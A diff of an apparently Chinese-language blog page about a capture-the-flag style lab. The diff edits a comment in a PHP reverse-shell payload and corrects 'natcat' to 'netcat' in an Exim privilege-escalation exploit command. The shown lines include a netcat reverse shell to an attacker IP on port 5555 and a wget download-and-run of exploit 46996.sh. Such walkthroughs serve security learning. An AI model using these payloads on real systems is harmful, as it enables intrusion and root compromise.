@@ -53,7 +53,7 @@
 <meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202406220047216.png">
 <meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202406220049532.png">
 <meta property="article:published_time" content="2024-06-21T16:57:04.000Z">
-<meta property="article:modified_time" content="2024-06-21T16:58:36.383Z">
+<meta property="article:modified_time" content="2024-08-12T14:13:39.678Z">
 <meta property="article:author" content="Candy">
 <meta property="article:tag" content="web攻防">
 <meta property="article:tag" content="打靶日记">
@@ -416,7 +416,7 @@
 <p>经过测试，当我们成功提交了联系邮件后则会触发我们写入的php语句，那么我们只需要写入相应的shell反弹语句，将shell反弹到我们的攻击机即可。</p>
 <p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202406220009335.png" srcset="/img/loading.gif" lazyload alt="image-20240622000911256"></p>
 <p>写入一下反弹shell脚本，攻击机监听5555端口；</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">// 目标机器IP和端口</span><br><span class="hljs-variable">$target_ip</span> = <span class="hljs-string">&#x27;192.168.111.129&#x27;</span>;<br><span class="hljs-variable">$target_port</span> = <span class="hljs-string">&#x27;5555&#x27;</span>;<br><br><span class="hljs-comment">// 构建反弹Shell命令</span><br><span class="hljs-variable">$command</span> = <span class="hljs-string">&quot;nc <span class="hljs-subst">$target_ip</span> <span class="hljs-subst">$target_port</span> -e /bin/sh&quot;</span>;<br><br><span class="hljs-comment">// 执行反弹Shell命令</span><br><span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$command</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">// 攻击机器IP和监听端口</span><br><span class="hljs-variable">$target_ip</span> = <span class="hljs-string">&#x27;192.168.111.129&#x27;</span>;<br><span class="hljs-variable">$target_port</span> = <span class="hljs-string">&#x27;5555&#x27;</span>;<br><br><span class="hljs-comment">// 构建反弹Shell命令</span><br><span class="hljs-variable">$command</span> = <span class="hljs-string">&quot;nc <span class="hljs-subst">$target_ip</span> <span class="hljs-subst">$target_port</span> -e /bin/sh&quot;</span>;<br><br><span class="hljs-comment">// 执行反弹Shell命令</span><br><span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$command</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
 
 <p>然后我们再次提交一份联系表单即可，可以看到攻击机已经成功接入</p>
 <p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202406220018529.png" srcset="/img/loading.gif" lazyload alt="image-20240622001809479"></p>
@@ -441,7 +441,7 @@
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">searchsploit exim 4<br>searchsploit -m 46996.sh<br><span class="hljs-built_in">cp</span> 46996.sh /var/www/html/<br>sudo systemctl start apache2<br></code></pre></td></tr></table></figure>
 
 <p>使用目标机子进入<code>/tmp</code>目录下载漏洞利用脚本</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> /tmp<br>wget http://192.168.111.129/46996.sh<br><span class="hljs-built_in">chmod</span> +x 46996.sh<br>./46996.sh -m natcat<br></code></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> /tmp<br>wget http://192.168.111.129/46996.sh<br><span class="hljs-built_in">chmod</span> +x 46996.sh<br>./46996.sh -m netcat<br></code></pre></td></tr></table></figure>
 
 <p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202406220042940.png" srcset="/img/loading.gif" lazyload alt="image-20240622004248895"></p>
 <p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202406220047216.png" srcset="/img/loading.gif" lazyload alt="image-20240622004724159"></p>
@@ -519,7 +519,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>更新于</div>
-          <div>2024年6月22日</div>
+          <div>2024年8月12日</div>
         </div>
       
       
